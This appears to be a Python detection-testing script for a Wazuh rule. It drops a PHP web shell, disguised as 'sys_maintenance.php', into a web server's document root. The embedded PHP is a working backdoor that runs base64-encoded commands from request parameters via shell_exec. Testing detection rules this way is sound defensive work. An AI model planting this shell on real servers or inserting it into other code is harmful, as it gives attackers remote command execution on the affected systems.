#!/usr/bin/env python3
"""
Red Team Simulation: Web Shell & Script Injection
Simulates adversary exploiting a file upload vulnerability or remote code execution (RCE)
to drop a web shell backdoor into the web document root (/var/www/html).
Corresponds to Wazuh Rule 100011 (MITRE T1505.003 & T1105).
"""

import os
import sys
import argparse
from pathlib import Path

PHP_WEBSHELL_PAYLOAD = """<?php
// Educational / Security Testing Simulation Only
// Simulated Command & Control Backdoor Interface
if (isset($_REQUEST['c2_cmd'])) {
    $cmd = base64_decode($_REQUEST['c2_cmd']);
    echo "<pre>" . shell_exec($cmd) . "</pre>";
    exit;
}
?>
"""

def drop_webshell(web_root: Path, filename: str = "sys_maintenance.php"):
    target = web_root / filename
    print(f"[*] Simulating web shell upload into: {target}")
    web_root.mkdir(parents=True, exist_ok=True)

    with open(target, "w", encoding="utf-8") as f:
        f.write(PHP_WEBSHELL_PAYLOAD)

    print(f"[+] Web shell payload dropped successfully: {target}")
    print(f"    Payload Size: {target.stat().st_size} bytes")
    print(f"    Expected Rule: 100011 (Level 12 - Web Shell Creation)")

def main():
    parser = argparse.ArgumentParser(description="Simulate Web Shell Injection")
    parser.add_argument("--web-root", type=str, default="/var/www/html")
    parser.add_argument("--filename", type=str, default="sys_maintenance.php")
    args = parser.parse_args()

    drop_webshell(Path(args.web_root), args.filename)

if __name__ == "__main__":
    main()
